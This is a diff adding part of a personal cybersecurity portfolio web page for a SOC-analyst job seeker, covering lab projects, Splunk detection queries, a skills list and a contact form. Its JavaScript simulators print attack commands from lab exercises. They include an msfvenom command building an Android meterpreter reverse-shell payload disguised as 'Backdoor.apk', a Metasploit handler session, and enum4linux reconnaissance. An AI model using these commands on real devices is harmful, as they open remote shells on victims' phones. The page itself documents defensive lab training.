+                                        <span class="text-cyber-purple font-bold">MobSF Audit Verdict:</span> App requests elevated OS permissions (<code class="text-cyber-red">READ_CONTACTS</code>, <code class="text-cyber-red">ACCESS_COARSE_LOCATION</code>) and exposed exported launcher tasks.
+                                    </div>
+                                </div>
+
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+                <!-- PROJECT C: Multi-Layered Mobile Data Loss Prevention (DLP) Framework -->
+                <div class="glass-panel p-6 lg:p-8 border-cyber-purple/30">
+                    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
+
+                        <!-- Left Details Column -->
+                        <div class="lg:col-span-5 space-y-4">
+                            <div class="flex items-center space-x-2 text-cyber-purple font-mono text-xs font-semibold uppercase tracking-wider">
+                                <span class="px-2 py-0.5 rounded bg-cyber-purple/10 border border-cyber-purple/30">Project C - Architecture</span>
+                                <span>Mobile DLP Matrix</span>
+                            </div>
+                            <h3 class="text-2xl font-bold text-cyber-heading">
+                                Multi-Layered Mobile Data Loss Prevention Architecture
+                            </h3>
+                            <p class="text-cyber-text text-sm leading-relaxed">
+                                Model spanning hardware root of trust (ARM TrustZone, TEE), OS/UEM policies, app containment (MAM), and radio channels. Verified screen-capture blocking via Android Test DPC in lab drills.
+                            </p>
+                        </div>
+
+                        <!-- Right Dynamic Matrix Visualizer -->
+                        <div class="lg:col-span-7">
+                            <div class="bg-black rounded-lg border border-cyber-border p-4 font-mono text-xs space-y-4">
+                                <div class="flex justify-between items-center pb-2 border-b border-cyber-border">
+                                    <span class="text-cyber-heading font-bold"><i class="fa-solid fa-layer-group text-cyber-purple mr-2"></i>Mobile DLP Layer Explorer</span>
+                                    <span class="text-cyber-blue text-[10px]">Tap a layer to inspect</span>
+                                </div>
+
+                                <div class="grid grid-cols-2 sm:grid-cols-4 gap-2">
+                                    <button onclick="selectDlpLayer('hardware')" id="dlp-btn-hardware" class="p-2.5 rounded bg-cyber-purple/20 text-cyber-purple border border-cyber-purple/50 text-center font-bold transition-all">
+                                        1. Hardware
+                                    </button>
+                                    <button onclick="selectDlpLayer('os')" id="dlp-btn-os" class="p-2.5 rounded bg-cyber-card text-cyber-text border border-cyber-border text-center hover:border-cyber-blue transition-all">
+                                        2. OS / UEM
+                                    </button>
+                                    <button onclick="selectDlpLayer('mam')" id="dlp-btn-mam" class="p-2.5 rounded bg-cyber-card text-cyber-text border border-cyber-border text-center hover:border-cyber-blue transition-all">
+                                        3. App / MAM
+                                    </button>
+                                    <button onclick="selectDlpLayer('network')" id="dlp-btn-network" class="p-2.5 rounded bg-cyber-card text-cyber-text border border-cyber-border text-center hover:border-cyber-blue transition-all">
+                                        4. Radio & RF
+                                    </button>
+                                </div>
+
+                                <div id="dlp-layer-display" class="p-4 rounded bg-[#05080c] border border-cyber-border space-y-3">
+                                </div>
+
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+                <!-- PROJECT D: Detection Engineering (Kerberoasting & DCSync) -->
+                <div class="glass-panel p-6 lg:p-8 border-cyber-yellow/30">
+                    <div class="grid grid-cols-1 lg:grid-cols-12 gap-8">
+
+                        <div class="lg:col-span-5 space-y-4">
+                            <div class="flex items-center space-x-2 text-cyber-yellow font-mono text-xs font-semibold uppercase tracking-wider">
+                                <span class="px-2 py-0.5 rounded bg-yellow-500/10 border border-yellow-500/30">Project D - Detection</span>
+                                <span>Identity Attacks</span>
+                            </div>
+                            <h3 class="text-2xl font-bold text-cyber-heading">
+                                Kerberoasting & DCSync Detection Engineering
+                            </h3>
+                            <p class="text-cyber-text text-sm leading-relaxed">
+                                Executed Active Directory identity attacks with Impacket (<code class="text-cyber-yellow">GetUserSPNs.py</code> and <code class="text-cyber-yellow">secretsdump.py</code>), configured GPO audit policies, and built custom Splunk SPL detections targeting MITRE ATT&CK T1558.003 and T1003.006.
+                            </p>
+
+                            <ul class="space-y-2 text-xs font-mono text-cyber-text">
+                                <li class="flex items-start">
+                                    <i class="fa-solid fa-check-circle text-cyber-yellow mt-0.5 mr-2"></i>
+                                    <span>Event ID 4769: Service ticket requests with weak RC4 encryption (0x17)</span>
+                                </li>
+                                <li class="flex items-start">
+                                    <i class="fa-solid fa-check-circle text-cyber-yellow mt-0.5 mr-2"></i>
+                                    <span>Event ID 4662: Directory service replication from non-DC hosts</span>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <div class="lg:col-span-7">
+                            <div class="bg-black rounded-lg border border-cyber-border p-4 font-mono text-xs space-y-3">
+                                <div class="text-cyber-yellow font-bold">// Kerberoasting Detection SPL Logic (EventCode 4769)</div>
+                                <div class="p-3 bg-[#05080c] rounded border border-cyber-border text-cyber-text leading-relaxed font-mono">
+                                    <span class="text-cyber-blue">index</span>=wineventlog <span class="text-cyber-purple">EventCode</span>=4769 <span class="text-cyber-purple">Ticket_Encryption_Type</span>=0x17<br>
+                                    | <span class="text-cyber-blue">search</span> Service_Name!="*$" Service_Name!="krbtgt"<br>
+                                    | <span class="text-cyber-blue">stats</span> count by Account_Name, Service_Name, Client_Address
+                                </div>
+                                <div class="text-cyber-text/60 text-[10px] flex justify-between items-center">
+                                    <span>ATT&CK Technique: T1558.003 (Kerberoasting)</span>
+                                    <span class="text-cyber-green font-bold">[Verified in Lab]</span>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- 4. TECHNICAL SKILLS MATRIX -->
+    <section id="skills" class="py-16 bg-[#0d1117] border-b border-cyber-border">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="text-center max-w-3xl mx-auto mb-12">
+                <div class="inline-flex items-center space-x-2 px-3 py-1 rounded-full bg-cyber-green/10 border border-cyber-green/30 text-xs font-mono text-cyber-green mb-3">
+                    <i class="fa-solid fa-list-check mr-1"></i> Technical Tooling
+                </div>
+                <h2 class="text-3xl font-bold text-cyber-heading tracking-tight">
+                    Skills & Core Capabilities
+                </h2>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 font-mono text-xs">
+
+                <!-- Defensive -->
+                <div class="glass-panel p-6 border-cyber-blue/30 space-y-3">
+                    <h3 class="text-base font-bold text-cyber-blue border-b border-cyber-border pb-2"><i class="fa-solid fa-shield-halved mr-2"></i>Defensive & SOC</h3>
+                    <div class="flex flex-wrap gap-1.5">
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Splunk SPL</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Sysmon</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Wazuh</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">CrowdSec</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Windows Event IDs</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">MITRE ATT&CK</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Active Directory</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Group Policy</span>
+                    </div>
+                </div>
+
+                <!-- Offensive -->
+                <div class="glass-panel p-6 border-cyber-red/30 space-y-3">
+                    <h3 class="text-base font-bold text-cyber-red border-b border-cyber-border pb-2"><i class="fa-solid fa-user-ninja mr-2"></i>Offensive & Mobile</h3>
+                    <div class="flex flex-wrap gap-1.5">
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Kali Linux</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Nmap</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">enum4linux</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Impacket</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Metasploit</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">msfvenom</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">MobSF</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Wireshark</span>
+                    </div>
+                </div>
+
+                <!-- Systems -->
+                <div class="glass-panel p-6 border-cyber-purple/30 space-y-3">
+                    <h3 class="text-base font-bold text-cyber-purple border-b border-cyber-border pb-2"><i class="fa-solid fa-network-wired mr-2"></i>Systems & Infra</h3>
+                    <div class="flex flex-wrap gap-1.5">
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">VMware Workstation</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Win Server 2022</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Linux</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">pfSense</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">TCP/IP, DNS, DHCP</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Python</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">PowerShell</span>
+                        <span class="px-2 py-1 rounded bg-cyber-bg border border-cyber-border">Bash & Git</span>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- 5. ABOUT ME & CONTACT FORM -->
+    <section id="about-contact" class="py-16">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
+
+                <!-- Pitch Box -->
+                <div class="lg:col-span-6 glass-panel p-6 border-cyber-border">
+                    <div class="flex items-center space-x-2 pb-4 border-b border-cyber-border font-mono text-xs text-cyber-blue">
+                        <i class="fa-solid fa-terminal"></i>
+                        <span>cat ~/about_mcdonald.txt</span>
+                    </div>
+
+                    <div class="mt-4 font-mono text-xs text-cyber-text space-y-3 leading-relaxed">
+                        <p class="text-cyber-heading font-bold">
+                            > McDonald Tatenda Handina, SOC Analyst / Threat Management Specialist
+                        </p>
+                        <p>
+                            Toronto-based cybersecurity graduate with a background in software development, IT support, and on-site physical security operations. I build isolated lab environments, configure Splunk telemetry pipelines, and run purple team simulations to verify that detections catch realistic attacks.
+                        </p>
+                        <div class="p-3 rounded bg-cyber-bg border border-cyber-border text-cyber-green">
+                            <span class="font-bold">[★] Open to:</span> SOC Analyst, Tier 1/2 Incident Response, Detection Engineering, Vulnerability Management, and IT Support roles in Toronto and Remote.
+                        </div>
+                        <div class="pt-2 text-cyber-text/80 space-y-1">
+                            <div><span class="text-cyber-blue font-bold">Email:</span> hantinamcdonald@gmail.com</div>
+                            <div><span class="text-cyber-blue font-bold">GitHub:</span> github.com/Mrpalmer08</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Contact Form -->
+                <div class="lg:col-span-6 glass-panel p-6 border-cyber-border">
+                    <div class="flex items-center space-x-2 pb-4 border-b border-cyber-border font-mono text-xs text-cyber-purple">
+                        <i class="fa-solid fa-paper-plane"></i>
+                        <span>Get In Touch</span>
+                    </div>
+
+                    <form id="contact-form" onsubmit="handleContactSubmit(event)" class="mt-4 space-y-4 font-mono text-xs">
+                        <div>
+                            <label class="block text-cyber-heading mb-1">Your name / organization</label>
+                            <input type="text" required placeholder="Hiring manager, security recruiter" class="w-full p-2.5 rounded bg-cyber-bg border border-cyber-border text-cyber-text focus:outline-none focus:border-cyber-blue transition-colors">
+                        </div>
+
+                        <div>
+                            <label class="block text-cyber-heading mb-1">Your email</label>
+                            <input type="email" required placeholder="name@company.com" class="w-full p-2.5 rounded bg-cyber-bg border border-cyber-border text-cyber-text focus:outline-none focus:border-cyber-blue transition-colors">
+                        </div>
+
+                        <div>
+                            <label class="block text-cyber-heading mb-1">Message</label>
+                            <textarea rows="4" required placeholder="Hello McDonald, I reviewed your portfolio..." class="w-full p-2.5 rounded bg-cyber-bg border border-cyber-border text-cyber-text focus:outline-none focus:border-cyber-blue transition-colors"></textarea>
+                        </div>
+
+                        <button type="submit" class="w-full py-3 rounded bg-gradient-to-r from-cyber-blue via-cyber-purple to-cyber-red text-black font-bold hover:opacity-90 transition-opacity flex items-center justify-center text-sm">
+                            <i class="fa-solid fa-paper-plane mr-2"></i> Transmit Message
+                        </button>
+                    </form>
+
+                    <div id="contact-toast" class="hidden mt-4 p-3 rounded bg-cyber-green/10 border border-cyber-green/40 text-cyber-green font-mono text-xs text-center">
+                        <i class="fa-solid fa-check-circle mr-1"></i> Transmission Acknowledged! Message logged successfully.
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="py-8 bg-black border-t border-cyber-border font-mono text-xs text-center text-cyber-text/60">
+        <div class="max-w-7xl mx-auto px-4">
+            <p>handina@sec-ops:~$ SOC analyst in training. I build the attack in my lab, then write the detection that catches it.</p>
+            <p class="mt-1 text-[10px] text-cyber-border">© 2026 McDonald Tatenda Handina (Mr. Palmer). Authorized to work in Canada.</p>
+        </div>
+    </footer>
+
+    <!-- INTERACTIVE JAVASCRIPT LOGIC -->
+    <script>
+        // PURPLE TEAM ARCHITECTURE CYCLE
+        let currentPurpleStage = 1;
+
+        const stageData = {
+            1: {
+                badge: "STAGE 1: Red Team Attack (enum4linux)",
+                badgeClass: "bg-cyber-red/20 text-cyber-red border-cyber-red/40",
+                desc: "<span class='text-cyber-red font-bold'>STAGE 1:</span> Kali Linux executes unauthenticated SMB/LDAP enumeration (<code class='text-cyber-blue'>enum4linux -a 192.168.49.10</code>) targeting Domain Controller ports (139, 445, 389).",
+                kaliBorder: "#ff4d4d",
+                dcBorder: "#ff4d4d",
+                splunkBorder: "#30363d",
+                purpleLoopOpacity: 0
+            },
+            2: {
+                badge: "STAGE 2: Blue Telemetry Ingestion",
+                badgeClass: "bg-cyber-blue/20 text-cyber-blue border-cyber-blue/40",
+                desc: "<span class='text-cyber-blue font-bold'>STAGE 2:</span> pfSense routes security audit telemetry. Windows Domain Controller & Endpoints transmit WinEventLog:Security events to Splunk SIEM.",
+                kaliBorder: "#30363d",
+                dcBorder: "#00d2ff",
+                splunkBorder: "#00d2ff",
+                purpleLoopOpacity: 0
+            },
+            3: {
+                badge: "STAGE 3: Purple Team Feedback Loop",
+                badgeClass: "bg-cyber-purple/20 text-cyber-purple border-cyber-purple/40",
+                desc: "<span class='text-cyber-purple font-bold'>STAGE 3:</span> Analyst queries Splunk SPL (<code class='text-cyber-purple'>EventCode=4625</code>), validates reconnaissance alerts, and tunes detection logic back to adversary emulation.",
+                kaliBorder: "#a855f7",
+                dcBorder: "#a855f7",
+                splunkBorder: "#a855f7",
+                purpleLoopOpacity: 1
+            }
+        };
+
+        function setPurpleStage(stage) {
+            currentPurpleStage = stage;
+            const data = stageData[stage];
+
+            const badgeEl = document.getElementById('purple-phase-badge');
+            badgeEl.className = `px-3 py-1 rounded-full border font-bold ${data.badgeClass}`;
+            badgeEl.innerText = data.badge;
+
+            document.getElementById('purple-stage-desc').innerHTML = data.desc;
+
+            for (let i = 1; i <= 3; i++) {
+                const btn = document.getElementById(`stage-btn-${i}`);
+                if (i === stage) {
+                    btn.className = `px-3 py-1.5 rounded font-bold border transition-all ${
+                        i === 1 ? 'bg-cyber-red/20 text-cyber-red border-cyber-red/50' :
+                        i === 2 ? 'bg-cyber-blue/20 text-cyber-blue border-cyber-blue/50' :
+                        'bg-cyber-purple/20 text-cyber-purple border-cyber-purple/50'
+                    }`;
+                } else {
+                    btn.className = "px-3 py-1.5 rounded bg-cyber-card text-cyber-text border border-cyber-border hover:border-cyber-blue transition-all";
+                }
+            }
+
+            document.querySelector('#node-kali rect').setAttribute('stroke', data.kaliBorder);
+            document.querySelector('#node-dc rect').setAttribute('stroke', data.dcBorder);
+            document.querySelector('#node-splunk rect').setAttribute('stroke', data.splunkBorder);
+
+            const allPaths = ['path-kali-pfsense', 'path-pfsense-dc', 'path-pfsense-ep', 'path-dc-splunk', 'path-ep-splunk', 'path-purple-feedback'];
+            allPaths.forEach(pId => {
+                const p = document.getElementById(pId);
+                p.setAttribute('class', '');
+                p.setAttribute('stroke', '#30363d');
+            });
+
+            if (stage === 1) {
+                document.getElementById('path-kali-pfsense').setAttribute('class', 'path-active-red');
+                document.getElementById('path-kali-pfsense').setAttribute('stroke', '#ff4d4d');
+                document.getElementById('path-pfsense-dc').setAttribute('class', 'path-active-red');
+                document.getElementById('path-pfsense-dc').setAttribute('stroke', '#ff4d4d');
+            } else if (stage === 2) {
+                document.getElementById('path-dc-splunk').setAttribute('class', 'path-active-blue');
+                document.getElementById('path-dc-splunk').setAttribute('stroke', '#00d2ff');
+                document.getElementById('path-ep-splunk').setAttribute('class', 'path-active-blue');
+                document.getElementById('path-ep-splunk').setAttribute('stroke', '#00d2ff');
+            } else if (stage === 3) {
+                document.getElementById('path-purple-feedback').setAttribute('class', 'path-active-purple');
+                document.getElementById('path-purple-feedback').setAttribute('stroke', '#a855f7');
+            }
+
+            document.getElementById('purple-loop-text').setAttribute('opacity', data.purpleLoopOpacity);
+        }
+
+        setInterval(() => {
+            currentPurpleStage = currentPurpleStage >= 3 ? 1 : currentPurpleStage + 1;
+            setPurpleStage(currentPurpleStage);
+        }, 4000);
+
+        // PROJECT A SIMULATOR
+        function runSimulatedScan() {
+            const body = document.getElementById('sim1-terminal-body');
+            body.innerHTML += `
+                <div class="text-cyber-red font-bold mt-2">┌──(kali㉿kali)-[~]</div>
+                <div class="text-cyber-red">└─$ enum4linux -a 192.168.49.10</div>
+                <div class="text-cyber-text/80">Starting enum4linux v0.9.1 on Wed Oct 28 11:32:37 2026</div>
+                <div class="text-cyber-text/80">[+] Got domain/workgroup name: LETSDEFEND</div>
+                <div class="text-cyber-text/80">[+] Domain Sid: S-1-5-21-848233000-867439076-3727323734</div>
+                <div class="text-cyber-red">[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED</div>
+                <div class="text-cyber-yellow text-[11px]">[!] Recon complete. 27 failed session events generated on DC.</div>
+            `;
+            body.scrollTop = body.scrollHeight;
+        }
+
+        function runSplunkQuery() {
+            const body = document.getElementById('sim1-terminal-body');
+            body.innerHTML += `
+                <div class="text-cyber-blue font-bold mt-2">splunk> sourcetype="WinEventLog:Security" (EventCode=4625 OR EventCode=4648)</div>
+                <div class="text-cyber-green">[✓] Query Executed across 66,969 indexed records.</div>
+                <div class="text-cyber-blue">[✓] Correlated 27 failed logon & explicit credential attempts from 192.168.49.130 (KALI).</div>
+            `;
+            body.scrollTop = body.scrollHeight;
+            document.getElementById('sim1-table-view').classList.remove('hidden');
+        }
+
+        function resetSim1() {
+            document.getElementById('sim1-terminal-body').innerHTML = `
+                <div class="text-cyber-text/60">// Splunk log engine ready. Listening on WinEventLog:Security...</div>
+                <div class="text-cyber-green">[✓] Indexer active: 66,969 events indexed</div>
+                <div class="text-cyber-blue">[i] Run the recon, then the detection query.</div>
+            `;
+            document.getElementById('sim1-table-view').classList.add('hidden');
+        }
+
+        // PROJECT B SIMULATOR
+        function switchProject2Tab(tab) {
+            const cliBtn = document.getElementById('tab-btn-cli');
+            const mobsfBtn = document.getElementById('tab-btn-mobsf');
+            const cliView = document.getElementById('p2-cli-view');
+            const mobsfView = document.getElementById('p2-mobsf-view');
+
+            if (tab === 'cli') {
+                cliBtn.className = "text-cyber-red font-bold border-b-2 border-cyber-red pb-0.5";
+                mobsfBtn.className = "text-cyber-text hover:text-cyber-purple transition-colors pb-0.5";
+                cliView.classList.remove('hidden');
+                mobsfView.classList.add('hidden');
+            } else {
+                mobsfBtn.className = "text-cyber-purple font-bold border-b-2 border-cyber-purple pb-0.5";
+                cliBtn.className = "text-cyber-text hover:text-cyber-red transition-colors pb-0.5";
+                mobsfView.classList.remove('hidden');
+                cliView.classList.add('hidden');
+            }
+        }
+
+        function runCmd(type) {
+            const out = document.getElementById('sim2-cli-output');
+            if (type === 'payload') {
+                out.innerHTML += `
+                    <div class="text-cyber-red font-bold mt-2"># msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.142.129 R > Backdoor.apk</div>
+                    <div class="text-cyber-text/80">Payload size: 10235 bytes</div>
+                    <div class="text-cyber-green">[✓] Backdoor.apk generated & copied to /var/www/html/share</div>
+                `;
+            } else if (type === 'handler') {
+                out.innerHTML += `
+                    <div class="text-cyber-purple font-bold mt-2">msf6 exploit(multi/handler) > exploit -j -z</div>
+                    <div class="text-cyber-text/80">[*] Started reverse TCP handler on 192.168.142.129:4444</div>
+                    <div class="text-cyber-green font-bold">[★] Meterpreter session 1 opened (192.168.142.129:4444 -> 192.168.142.130:55096)</div>
+                `;
+            } else if (type === 'sysinfo') {
+                out.innerHTML += `
+                    <div class="text-cyber-blue font-bold mt-2">meterpreter > sysinfo</div>
+                    <div class="text-cyber-text/90">OS: Android 9 - Linux 4.19.110-android-x86_64</div>
+                    <div class="text-cyber-text/90">Meterpreter: dalvik/android</div>
+                `;
+            } else if (type === 'ps') {
+                out.innerHTML += `
+                    <div class="text-cyber-green font-bold mt-2">meterpreter > pwd & ps</div>
+                    <div class="text-cyber-text/80">Current path: /storage/emulated/0</div>
+                    <div class="text-cyber-text/80">PID: 5296 | Name: com.metasploit.stage</div>
+                `;
+            }
+            out.scrollTop = out.scrollHeight;
+        }
+
+        // PROJECT C SIMULATOR
+        const dlpData = {
+            hardware: {
+                title: "1. Hardware Root of Trust",
+                tech: "ARM TrustZone, TEE, KeyMint",
+                status: "<span class='text-cyber-green font-bold'>ENFORCED</span> - Keys hardware-bound inside Secure Enclave."
+            },
+            os: {
+                title: "2. OS / UEM Controls",
+                tech: "Full-Disk Encryption (FDE), Geofencing",
+                status: "<span class='text-cyber-blue font-bold'>ENFORCED</span> - Remote Selective Wipe active."
+            },
+            mam: {
+                title: "3. App Containerization (MAM)",
+                tech: "Test DPC, Secure Clipboard, Screen-Capture Block",
+                status: "<span class='text-cyber-purple font-bold'>RESTRICTED</span> - Screen Capture & Copy/Paste Blocked."
+            },
+            network: {
+                title: "4. Radio & Network Security",
+                tech: "Per-App VPN, SSL Inspection, EMR Monitoring",
+                status: "<span class='text-cyber-green font-bold'>MONITORED</span> - Per-app tunnels active."
+            }
+        };
+
+        function selectDlpLayer(layer) {
+            const data = dlpData[layer];
+            const display = document.getElementById('dlp-layer-display');
+
+            ['hardware', 'os', 'mam', 'network'].forEach(l => {
+                const btn = document.getElementById(`dlp-btn-${l}`);
+                if (l === layer) {
+                    btn.className = "p-2.5 rounded bg-cyber-purple/20 text-cyber-purple border border-cyber-purple/50 text-center font-bold transition-all";
+                } else {
+                    btn.className = "p-2.5 rounded bg-cyber-card text-cyber-text border border-cyber-border text-center hover:border-cyber-blue transition-all";
+                }
+            });
+
+            display.innerHTML = `
+                <div class="text-cyber-heading font-bold text-sm">${data.title}</div>
+                <div><span class="text-cyber-purple font-bold">Core Tech:</span> ${data.tech}</div>
+                <div class="p-2 rounded bg-cyber-bg border border-cyber-border"><span class="text-cyber-blue font-bold">Policy Status:</span> ${data.status}</div>
+            `;
+        }
+        selectDlpLayer('hardware');
+
+        // CONTACT FORM TOAST
+        function handleContactSubmit(e) {
+            e.preventDefault();
+            const toast = document.getElementById('contact-toast');
+            toast.classList.remove('hidden');
+            e.target.reset();
+            setTimeout(() => toast.classList.add('hidden'), 5000);
+        }
+    </script>
+</body>
+</html>
